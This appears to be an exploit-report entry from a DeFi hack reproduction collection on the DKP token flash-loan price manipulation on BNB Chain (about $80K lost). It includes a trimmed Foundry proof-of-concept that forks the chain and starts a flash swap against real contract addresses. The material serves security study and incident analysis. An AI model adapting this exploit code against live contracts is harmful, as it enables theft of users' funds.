# [?] - DKP - FlashLoan price manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DKP
Published: 2023-03-08
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/DKP_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$80K
References:
- https://twitter.com/CertiKAlert/status/1633421908996763648
- https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271
- https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01

```solidity
contract ContractTest is Test {
    IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_284_131);
        cheats.label(address(DKP), "DKP");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(DKPExchange), "DKPExchange");
    }

    function testExploit() public {
        deal(address(USDT), address(this), 800 * 1e18);
        exchangeDKP();
        DKPToUSDT();

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)) - 800 * 1e18, USDT.decimals()
        );
    }

    function exchangeDKP() internal {
        uint256 flashAmount = USDT.balanceOf(address(Pair)) * 9992 / 10_000;
        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/DKP_exp.sol_
